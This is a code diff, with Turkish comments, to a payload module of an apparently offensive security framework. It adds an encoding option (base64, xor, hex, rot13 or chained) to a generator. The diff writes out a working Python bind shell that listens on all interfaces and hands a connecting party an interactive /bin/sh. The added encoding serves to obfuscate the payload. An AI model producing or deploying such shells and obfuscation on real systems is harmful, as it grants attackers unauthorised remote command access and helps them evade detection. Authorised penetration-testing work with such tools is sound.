@@ -16,6 +16,7 @@ class Payload(BaseModule):
         super().__init__()
         self.Options = {
             "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
+            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir)."),
             "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir=".")
         }
 
@@ -24,7 +25,7 @@ class Payload(BaseModule):
         lport = self.get_option_value("LPORT")
 
         # Python bind shell implementation
-        payload = f"""
+        raw_payload = f"""
 import socket,os,subprocess
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.bind(("0.0.0.0",{lport}))
@@ -35,7 +36,9 @@ os.dup2(c.fileno(),1)
 os.dup2(c.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
 """
-        return payload.strip()
+        encode_type = self.get_option_value("ENCODE")
+        from core.encoders.manager import apply_encoding
+        return apply_encoding(raw_payload.strip(), encode_type)
 
     def run(self, options: Dict[str, Any]):
         """Payload oluştur ve ekrana bas/kaydet."""
